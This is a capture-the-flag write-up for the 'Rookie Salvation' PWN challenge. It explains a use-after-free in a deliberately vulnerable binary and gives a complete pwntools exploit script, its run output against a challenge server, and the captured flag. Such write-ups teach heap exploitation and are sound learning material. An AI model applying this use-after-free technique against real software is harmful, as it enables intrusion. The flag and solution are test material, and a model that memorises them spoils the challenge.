# Rookie Salvation - PWN Challenge

**Category:** PWN  
**Difficulty:** Medium  
**Points:** TBD  
**Author:** w3th4nds  
**Solved by:** Deriv Security Team

## Challenge Description

```
Rook's last stand against NEMEGHAST begins now. This is no longer a simulation—it's the collapse of control. 
Legend speaks of only one entity who ever broke free from the Matrix: the original architect of NEMEGHAST. 
His name—buried, forbidden, encrypted—was the master key. If you can recover it… and inject it into the core... 
Rook will finally be free.
```

**Connection Info:**
- **Host:** 46.101.163.234
- **Port:** 31649

## Files Provided

- `rookie_salvation` - Main binary executable

## Initial Analysis

### Binary Information

```bash
$ file rookie_salvation
rookie_salvation: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

### Security Features

```bash
$ checksec rookie_salvation
[*] '/path/to/rookie_salvation'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The binary has all modern security protections enabled:
- **Full RELRO** - GOT is read-only
- **Stack Canary** - Stack overflow protection
- **NX** - Non-executable stack
- **PIE** - Position Independent Executable
- **SHSTK** - Shadow Stack (Intel CET)
- **IBT** - Indirect Branch Tracking (Intel CET)

## Vulnerability Analysis

### Hints from README

The challenge provided several critical hints:

```
* Just let it freeee....
* 0xdeadbeef? Nah, w3th4nds is better..
* How much to allocate? 20? 0x20? 0x2000000000000?
* Where is the offset to overwrite?
* ESCAPE
```

Key insights:
1. **"Just let it freeee"** - Suggests using the free/obliterate function
2. **"w3th4nds is better"** - This is the magic string we need (the "architect's name")
3. **Allocation size matters** - Need to find the correct size (0x26 = 38 bytes)
4. **Offset is important** - Magic string needs to be at offset 0x1e (30 bytes)

### The Vulnerability: Use-After-Free (UAF)

The challenge implements a classic **Use-After-Free (UAF)** vulnerability combined with heap reuse:

1. The program allocates a chunk of memory (`allocated_space`)
2. The `obliterate()` function frees this chunk but the pointer remains valid
3. The `reserve_space()` function can reallocate memory
4. If we allocate the same size, we get the same heap chunk back
5. We can then write to this reallocated chunk
6. The `road_to_salvation()` function checks if the memory at a specific offset contains "w3th4nds"

## Exploitation Strategy

### Step-by-Step Approach

1. **Free the original chunk** - Call `obliterate()` to free `allocated_space`
2. **Reallocate the same chunk** - Use `reserve_space()` with size 38 (0x26) to get the same memory
3. **Overwrite with payload** - Write 30 bytes of padding + "w3th4nds" at offset 0x1e
4. **Trigger flag check** - Call `road_to_salvation()` to verify and print the flag

### Memory Layout

```
Heap Chunk (38 bytes total):
[0x00 - 0x1d] -> Padding (30 bytes)
[0x1e - 0x25] -> "w3th4nds" (8 bytes) <- Magic string location
```

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./rookie_salvation')
context.log_level = 'info'

def exploit(target):
    """
    Exploit strategy for Rookie Salvation:
    1. Use obliterate() to free the allocated_space chunk
    2. Use reserve_space() to reallocate the same chunk with size 0x26
    3. Write payload with "w3th4nds" at offset 0x1e (30 bytes)
    4. Call road_to_salvation() to trigger flag print
    
    This is a Use-After-Free (UAF) exploitation combined with heap reuse.
    """
    p = target
    
    # Wait for menu
    p.recvuntil(b'>')
    
    # Step 1: Free the allocated_space chunk using obliterate
    log.info("Step 1: Freeing allocated_space chunk")
    p.sendline(b'2')  # obliterate
    p.recvuntil(b'>')
    
    # Step 2: Reallocate the chunk with reserve_space
    log.info("Step 2: Reallocating chunk with size 0x26 (38 bytes)")
    p.sendline(b'1')  # reserve_space
    p.recvuntil(b'reserve: ')
    
    # Allocate 38 bytes (0x26) - same size as original chunk
    size = 38
    p.sendline(str(size).encode())
    p.recvuntil(b'DELEGHAST: ')
    
    # Step 3: Write payload with "w3th4nds" at offset 0x1e (30 bytes)
    log.info("Step 3: Writing payload with target string at offset 0x1e")
    payload = b'A' * 30  # Padding to reach offset 0x1e
    payload += b'w3th4nds'  # Target string at correct offset
    p.sendline(payload)
    
    # Step 4: Call road_to_salvation to get the flag
    log.info("Step 4: Calling road_to_salvation to trigger flag")
    p.recvuntil(b'>')
    p.sendline(b'3')  # road_to_salvation
    
    # Get the flag
    response = p.recvall(timeout=2)
    log.success(f"Response: {response.decode()}")
    
    # Look for flag pattern
    if b'HTB{' in response:
        flag_start = response.find(b'HTB{')
        flag_end = response.find(b'}', flag_start) + 1
        flag = response[flag_start:flag_end].decode()
        log.success(f"FLAG: {flag}")
    
    p.close()

if __name__ == '__main__':
    if args.REMOTE:
        target = remote('46.101.163.234', 31649)
    else:
        target = process('./rookie_salvation')
    
    exploit(target)
```

## Running the Exploit

```bash
$ python exploit_final.py REMOTE
[*] '/home/kali/Desktop/CTF/pwn_rookie_salvation/rookie_salvation'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 46.101.163.234 on port 31649: Done
[*] Step 1: Freeing allocated_space chunk
[*] Step 2: Reallocating chunk with size 0x26 (38 bytes)
[*] Step 3: Writing payload with target string at offset 0x1e
[*] Step 4: Calling road_to_salvation to trigger flag
[+] Receiving all data: Done (148B)
[*] Closed connection to 46.101.163.234 port 31649
[+] Response:  [1;35m
    [[1;32mUnknown Voice[1;35m] ✨ 𝐅𝐢𝐧𝐚𝐥𝐥𝐲.. 𝐓𝐡𝐞 𝐰𝐚𝐲.. 𝐎𝐮𝐭..[1;35m[0mHHTB{h34p_2_h34v3n}
    
[+] FLAG: HTB{h34p_2_h34v3n}
```

## Flag

```
HTB{h34p_2_h34v3n}
```

## Key Takeaways

1. **Use-After-Free vulnerabilities** remain a critical class of heap exploitation bugs
2. **Heap memory reuse** can be predictable in certain scenarios, especially with small allocations
3. **Magic values** at specific offsets are common in CTF challenges to verify successful exploitation
4. The flag name **"h34p_2_h34v3n"** (heap to heaven) perfectly describes the exploitation technique

## References

- [Use-After-Free Exploitation](https://cwe.mitre.org/data/definitions/416.html)
- [Heap Exploitation Techniques](https://heap-exploitation.dhavalkapil.com/)
- [pwntools Documentation](https://docs.pwntools.com/)

---

**Writeup by:** Deriv Security Team  
**Challenge Author:** w3th4nds  
**Date Solved:** October 25, 2025

